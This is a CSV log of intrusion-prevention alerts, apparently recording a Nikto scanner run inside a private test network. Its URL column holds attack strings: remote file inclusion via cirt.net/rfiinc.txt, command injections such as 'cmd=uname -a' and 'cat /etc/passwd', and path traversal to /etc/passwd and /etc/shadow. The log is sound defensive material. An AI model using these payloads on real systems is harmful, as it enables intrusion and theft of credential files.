attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,subtype,eventtype,url
15116,7613759,1,medium,phpBG.Rootdir.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51128,80,ips,signature,/intern/admin/?rootdir=http://cirt.net/rfiinc.txt?
12699,7613759,49,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51128,80,ips,signature,-
44780,7613759,36,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51128,80,ips,signature,-
15116,7613759,4,medium,phpBG.Rootdir.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51128,80,ips,signature,-
12699,7613760,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51130,80,ips,signature,/ktmlpro/includes/ktedit/toolbar.php?dirDepth=http://cirt.net/rfiinc.txt?
12699,7613761,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/lang/leslangues.php?fichier=http://cirt.net/rfiinc.txt?
44780,7613761,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/lang_english/lang_main_album.php?phpbb_root_path=http://cirt.net/rfiinc.txt??a=
15092,7613761,1,high,OFFL.DOC.ROOT.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/lib/functions.php?DOC_ROOT=http://cirt.net/rfiinc.txt?
14850,7613761,1,high,LMS.LAN.Management.Language.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/lib/language.php?_LIB_DIR=http://cirt.net/rfiinc.txt?
14942,7613761,1,high,AdminBot.Live_Status.Lib.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/lib/live_status.lib.php?ROOT=http://cirt.net/rfiinc.txt?
14949,7613761,1,high,Linksnet.Newsfeed.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/linksnet_newsfeed/linksnet_linkslog_rss.php?dirpath_linksnet_newsfeed=http://cirt.net/rfiinc.txt?
14852,7613761,1,high,SerWeb.LoadLang.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/load_lang.php?_SERWEB[serwebdir]=http://cirt.net/rfiinc.txt?
48010,7613761,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/mamboleto.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
12699,7613761,58,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,-
44780,7613761,32,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,-
15092,7613761,1,high,OFFL.DOC.ROOT.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,-
14949,7613761,1,high,Linksnet.Newsfeed.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,-
48010,7613761,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,-
12699,7613762,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,/manage_songs.php?foing_root_path=http://cirt.net/rfiinc.txt?
15118,7613762,1,medium,phpRealty.MGR.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,/manager/admin/index.php?MGR=http://cirt.net/rfiinc.txt?
44780,7613762,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,/members/index.php?INC=http://cirt.net/rfiinc.txt??
29564,7613762,1,medium,PHP.Remote.Arbitrary.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,/membres/membreManager.php?include_path=http://cirt.net/rfiinc.txt??
14855,7613762,1,high,NoBoard.User.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,/mkportal/include/user.php?MK_PATH=http://cirt.net/rfiinc.txt?
14859,7613762,1,high,Musoo.Parameter.GLOBALS.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,/modules/MusooTemplateLite.php?GLOBALS[ini_array][EXTLIB_PATH]=http://cirt.net/rfiinc.txt?
14743,7613762,1,high,Persism.Content.Management.System.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,/modules/blocks/headerfile.php?system[path]=http://cirt.net/rfiinc.txt?
14734,7613762,1,low,Xoops.Multiple.Modules.SpawControl.Class.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,/modules/cjaycontent/admin/editor2/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt?
12699,7613762,51,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,-
15118,7613762,2,medium,phpRealty.MGR.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,-
44780,7613762,35,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,-
14855,7613762,1,high,NoBoard.User.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,-
14859,7613762,1,high,Musoo.Parameter.GLOBALS.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,-
14743,7613762,2,high,Persism.Content.Management.System.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,-
14734,7613762,1,low,Xoops.Multiple.Modules.SpawControl.Class.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,-
14743,7613763,1,high,Persism.Content.Management.System.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/forums/blocks/latest_posts.php?system[path]=http://cirt.net/rfiinc.txt?
44780,7613763,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/global/inc/content.inc.php?sIncPath=http://cirt.net/rfiinc.txt??
12699,7613763,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/groupadm/index.php?full_path=http://cirt.net/rfiinc.txt?
14742,7613763,1,low,Xoops.Horoscope.Module.Footer.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/horoscope/footer.php?xoopsConfig[root_path]=http://cirt.net/rfiinc.txt?
14734,7613763,1,low,Xoops.Multiple.Modules.SpawControl.Class.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/icontent/include/wysiwyg/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt?
48010,7613763,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/mod_as_category.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
14406,7613763,1,low,PostGuestbook.Header.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir=http://cirt.net/rfiinc.txt??
15110,7613763,1,medium,iziContents.gsLanguage.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/search/search.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt?
14859,7613763,1,high,Musoo.Parameter.GLOBALS.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/msDb.php?GLOBALS[ini_array][EXTLIB_PATH]=http://cirt.net/rfiinc.txt?
14950,7613763,1,low,NcasterCMS.Archive.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/ncaster/admin/addons/archive/archive.php?adminfolder=http://cirt.net/rfiinc.txt?
14230,7613763,1,medium,ZebraFeeds.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/newsfeeds/includes/aggregator.php?zf_path=http://cirt.net/rfiinc.txt?
14743,7613763,6,high,Persism.Content.Management.System.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,-
44780,7613763,25,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,-
12699,7613763,49,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,-
14734,7613763,4,low,Xoops.Multiple.Modules.SpawControl.Class.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,-
48010,7613763,4,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,-
15110,7613763,1,medium,iziContents.gsLanguage.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,-
14230,7613763,1,medium,ZebraFeeds.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,-
44780,7613764,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,/noticias.php?inc=http://cirt.net/rfiinc.txt??
12699,7613764,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,/nucleus/plugins/skinfiles/index.php?DIR_LIBS=http://cirt.net/rfiinc.txt?
14265,7613764,1,low,Open.Conference.Systems.Fullpath.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,/ocs/include/footer.inc.php?fullpath=http://cirt.net/rfiinc.txt??
29564,7613764,1,medium,PHP.Remote.Arbitrary.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,/open-admin/plugins/site_protection/index.php?config%5boi_dir%5d=http://cirt.net/rfiinc.txt??
14338,7613764,1,low,PAFileDB.Constants.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,/pafiledb/includes/pafiledb_constants.php?module_root_path=http://cirt.net/rfiinc.txt?
10819,7613764,1,high,PHP.Phorum.Arbitrary.Code.Execution,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,/phorum/plugin/replace/plugin.php?PHORUM[settings_dir]=http://cirt.net/rfiinc.txt?
44780,7613764,35,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,-
12699,7613764,59,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,-
14265,7613764,1,low,Open.Conference.Systems.Fullpath.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,-
44780,7613765,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51140,80,ips,signature,/phpreactor/inc/view.inc.php?pathtohomedir=http://cirt.net/rfiinc.txt??
12699,7613765,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51140,80,ips,signature,/phpress/adisplay.php?lang=http://cirt.net/rfiinc.txt?
14851,7613765,1,high,POWL.Htmledit.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51140,80,ips,signature,/plugins/widgets/htmledit/htmledit.php?_POWL[installPath]=http://cirt.net/rfiinc.txt?
14953,7613765,1,low,PHP.Blue.Dragon.CMS.Activecontent.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51140,80,ips,signature,/public_includes/pub_blocks/activecontent.php?vsDragonRootPath=http://cirt.net/rfiinc.txt?
44780,7613765,39,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51140,80,ips,signature,-
12699,7613765,56,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51140,80,ips,signature,-
44780,7613767,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51142,80,ips,signature,/readmore.php?config[\\\
12699,7613767,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51142,80,ips,signature,/recent.php?insPath=http://cirt.net/rfiinc.txt?
48010,7613767,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51142,80,ips,signature,/releasenote.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
44780,7613767,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51142,80,ips,signature,-
12699,7613767,5,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51142,80,ips,signature,-
12699,7613768,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,/rempass.php?lang=http://cirt.net/rfiinc.txt?
44780,7613768,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,/report.php?scriptpath=http://cirt.net/rfiinc.txt??
14404,7613768,1,medium,MySQL.Commander.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,/ressourcen/dbopen.php?home=http://cirt.net/rfiinc.txt??
48010,7613768,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,/script_path/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
15114,7613768,1,medium,Helplink.Show.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,/show.php?file=http://cirt.net/rfiinc.txt?
12699,7613768,60,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,-
44780,7613768,35,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,-
48010,7613768,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,-
12699,7613769,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,/skin/dark/template.php?path=http://cirt.net/rfiinc.txt?
14952,7613769,1,high,OTE.Header.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,/skins/header.php?ote_home=http://cirt.net/rfiinc.txt?
44780,7613769,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,/skysilver/login.tpl.php?theme=http://cirt.net/rfiinc.txt??
14856,7613769,1,low,PhpConcept.Library.Parameter.g_pcltar_lib_dir.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,/snippetmaster/includes/tar_lib/pcltar.lib.php?g_pcltar_lib_dir=http://cirt.net/rfiinc.txt??
14341,7613769,1,high,Aardvark.Topsites.PHP.Remote.Command.Execution,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,/sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]=http://cirt.net/rfiinc.txt??cmd=ls
14734,7613769,1,low,Xoops.Multiple.Modules.SpawControl.Class.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt?
14858,7613769,1,high,SPHPell.SpellIncPath.Level.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,/spellcheckwindowframeset.php?SpellIncPath=http://cirt.net/rfiinc.txt?
12699,7613769,55,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,-
44780,7613769,12,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,-
44780,7613770,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51148,80,ips,signature,/studip-1.3.0-2/studip-phplib/oohforms.inc?cmd=ls -al&_PHPLIB[libdir]=http://cirt.net/rfiinc.txt??
12699,7613771,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,/styles.php?toroot=http://cirt.net/rfiinc.txt?
44780,7613771,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,/subscp.php?phpbb_root_path=http://cirt.net/rfiinc.txt??
14266,7613771,1,low,OpenDock.Doc.Directory.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,/sw/lib_comment/comment.php?doc_directory=http://cirt.net/rfiinc.txt??
14736,7613771,1,high,Geeklog.ImageImageMagick.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,/system/ImageImageMagick.php?glConf[path_system]=http://cirt.net/rfiinc.txt?
48010,7613771,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,/templates/be2004-2/index.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
14345,7613771,1,low,PBLang.Lang.NL.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,/templates/pb/language/lang_nl.php?temppath=http://cirt.net/rfiinc.txt?
12699,7613771,68,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,-
44780,7613771,20,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,-
14266,7613771,6,low,OpenDock.Doc.Directory.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,-
14736,7613771,1,high,Geeklog.ImageImageMagick.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,-
44780,7613772,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51152,80,ips,signature,/themes/header.php?theme_directory=http://cirt.net/rfiinc.txt?%00
12699,7613772,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51152,80,ips,signature,/themes/ubb/login.php?theme=http://cirt.net/rfiinc.txt?
15225,7613772,1,high,Tiki.Wiki.Tiki.Graph.Formula.PHP.Code.Injection,HTTP,172.16.1.2,172.16.2.2,51152,80,ips,signature,/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?
44780,7613772,3,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51152,80,ips,signature,-
12699,7613772,5,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51152,80,ips,signature,-
44780,7613773,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51154,80,ips,signature,/topsites/index.php?page=http://cirt.net/rfiinc.txt??&cmd=uname -a
12699,7613774,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,/towels-0.1/src/scripture.php?pageHeaderFile=http://cirt.net/rfiinc.txt?
29614,7613774,1,high,TSEP.Colorswitch.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,/tsep/include/colorswitch.php?tsep_config[absPath]=http://cirt.net/rfiinc.txt?
44780,7613774,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,/ubbt.inc.php?GLOBALS[thispath]=http://cirt.net/rfiinc.txt??
43336,7613774,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,/user.php?caselist[bad_file.txt][path]=http://cirt.net/rfiinc.txt?&command=cat%20/etc/passwd
14484,7613774,1,high,BT.Sondage.Gestion.Sondage.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,/utilitaires/gestion_sondage.php?repertoire_visiteur=http://cirt.net/rfiinc.txt?
14948,7613774,1,high,LaVague.PrintBar.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,/views/print/printbar.php?views_path=http://cirt.net/rfiinc.txt?
12699,7613774,57,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,-
29614,7613774,1,high,TSEP.Colorswitch.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,-
44780,7613774,36,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,-
14484,7613774,1,high,BT.Sondage.Gestion.Sondage.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,-
12699,7613775,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51158,80,ips,signature,/web/BetaBlockModules/ImagesModule/ImagesModule.php?path_prefix=http://cirt.net/rfiinc.txt?
44780,7613775,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51158,80,ips,signature,/web/BetaBlockModules/MembersFacewallModule/MembersFacewallModule.php?current_blockmodule_pathhttp://cirt.net/rfiinc.txt?
48010,7613775,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51158,80,ips,signature,/worldpay_notify.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
17702,7613775,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51158,80,ips,signature,/scripts/message/message_dialog.tml?how_many_back=\\\
12699,7613775,66,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51158,80,ips,signature,-
44780,7613775,31,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51158,80,ips,signature,-
44780,7613776,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51160,80,ips,signature,/config/config.txt
44780,7613776,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51160,80,ips,signature,-
44780,7613777,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51162,80,ips,signature,/ccp14admin/
44780,7613777,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51162,80,ips,signature,-
44780,7613778,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51164,80,ips,signature,/UserLogin/
10604,7613778,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51164,80,ips,signature,/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/vmware/hostd/vmInventory.xml
44780,7613778,27,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51164,80,ips,signature,-
17702,7613779,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51166,80,ips,signature,/
44780,7613780,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51168,80,ips,signature,/jk-status
29965,7613780,1,medium,Splunk.Web.Component.Parameter.Injection,HTTP,172.16.1.2,172.16.2.2,51168,80,ips,signature,/en-GB/debug/sso
43336,7613780,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51168,80,ips,signature,/axis2/services/Version?xsd=../../../../../../../../../../../etc/passwd
44780,7613780,97,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51168,80,ips,signature,-
29965,7613780,1,medium,Splunk.Web.Component.Parameter.Injection,HTTP,172.16.1.2,172.16.2.2,51168,80,ips,signature,-
44780,7613781,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51170,80,ips,signature,/servlet/hitcount
10604,7613781,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51170,80,ips,signature,/../../windows/dvr2.ini
44780,7613781,18,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51170,80,ips,signature,-
43336,7613782,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51172,80,ips,signature,/htdocs/../../../../../../../../../../../etc/passwd
44780,7613783,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51174,80,ips,signature,/?-s
31752,7613783,1,high,PHP.CGI.Argument.Injection,HTTP,172.16.1.2,172.16.2.2,51174,80,ips,signature,/login.php?-s
29263,7613783,1,low,SVN.Sensitive.File.Access,HTTP,172.16.1.2,172.16.2.2,51174,80,ips,signature,/.svn/entries
47202,7613783,1,high,TP-Link.TL-R600VPN.HTTP.Server.help.Information.Disclosure,HTTP,172.16.1.2,172.16.2.2,51174,80,ips,signature,/help/../../../../../../../../../../../../../../../../etc/shadow
44780,7613783,9,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51174,80,ips,signature,-
44780,7613784,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51176,80,ips,signature,/snoop/
44780,7613784,50,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51176,80,ips,signature,-
